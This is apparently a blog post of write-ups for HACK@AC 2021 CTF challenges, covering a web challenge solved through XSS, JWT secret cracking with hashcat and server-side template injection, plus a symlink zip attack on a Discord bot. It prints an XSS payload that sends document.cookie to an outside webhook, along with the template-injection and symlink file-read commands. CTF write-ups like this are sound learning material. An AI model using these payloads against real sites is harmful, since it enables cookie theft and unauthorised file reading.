#HACK@AC 2021 Writeups by samuzora

HACK@AC is a CTF organized by the Anglo-Chinese School (Independent) Robotics Technology Society, held on 16 Oct 2021. I was part of the organizing team and made a grand total of 4 challenges (one got removed later on). It was generally quite a fun experience for all (excluding !help) and I learnt quite a bit from organizing this CTF, from dockerizing applications to debugging trivial typos. Below are writeups for some of the challenges, both made by me and by others.

[Crypto](##crypto)

[Web](##web)

[Misc](##misc)

[]




## Web

### FatherBoat

Difficulty: Hard

Solves: 0 :<

Link: http://139.59.124.129:51000/

Description: You've heard of Mothership but have you heard of FatherBoat? Due to Mothership stealing all their visitors, the company couldn't make enough revenue to hire a good web dev. Before he left, he might have screwed over some stuff... Don't be too harsh on them please.

Author: Lucas

Intended Solution:
1. XSS
  Payload: `<script>fetch("https://webhook.site/unique-id/?c="+document.cookie)</script>`
  Explanation: The website tells us that one requires approval from the admin to post a story. Instead of getting approval from the admin, one can instead be the admin and thus bypass the approval process, especially since the admin seems to be sleeping/braindead. XSS is possible here as the story of the user is injected directly into the HTML DOM. The cookie is `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ImZhbHNlIn0.OqbksdUdBezk8bCqbh7wJOBuHFIKGoKGkdbAiu9SiJk`
2. Hashcat
  Payload: `./hashcat.exe -a 3 -m 16500 ./.hash --increment ?l?l?l?l?l?l`
  Explanation: After obtaining the token from the admin and checking it out with jwt.io, it seems like even the admin isn't an admin, which sucks tbh. (blame it on the dev) So we have to crack the JWT secret. Luckily for us, the secret isn't very long, so it can be cracked easily using Hashcat (6 lowercase chars). The key is "father".
3. SSTI
  Payload: `{{get_file('flag.txt')}}`
  Explanation: After verifying ourselves as the admin, we can successfully submit stories. However, upon submitting a story, the website prompts us that "Server-side story sharing" has yet to be implemented. This is a direct hint towards Server Side Template Injection (SSTI), so one can test for possible SSTI with ``{{7*7}} or {{7*'7'}}``. Then at a loss of what exactly to do, one might attempt `{{config.items()}}` and stumble upon 2 important key-value pairs: `('BUILT_IN', 'get_file()'), ('FLAG', 'flag.txt')`. Afterwards it's easy, just `{{get_file('flag.txt')}}` to get the flag, `ACSI{gr4ndf4th3r_v3ssel}`.

Comments:
This challenge was made quite last minute, as we were kinda short of hard web challenges. The puppeteer was especially hard to set up. Originally I tried using the Python import of puppeteer, pyppeteer, but it turned out to be a nightmare. Afterwards I just set up an API for the JS puppeteer and the Python flask app to interact. According to inside info, HCI had already solved the XSS part, but they realized it was a multi-part challenge and just gave up :(. Hence 0 solves

## Misc

### !help

Difficulty: ~~Medium~~ **HARD**

Solves: 3 (all HCI btw)

Description: There's a bot in the CTF discord that seems unusually quiet. Maybe try DMing it? I hear he gives flags...

Author: Lucas

Intended Solution:

**Zip Slip**

The intended (obvious) solution was to exploit the fact that the bot only accepted .zip files in the !upload command. Admittedly, without sufficient experience this might have been hard to spot, but granted that the participants were allowed to google I thought that this wouldn't be too difficult. Anyway, the 2-liner command to generate the symlink and zip it is as follows: `ln -s /flag.txt link; zip -y payload.zip link`. Then !upload `payload.zip` and the bot will return the flag, `ACSI{symb0l1c_link5}`.
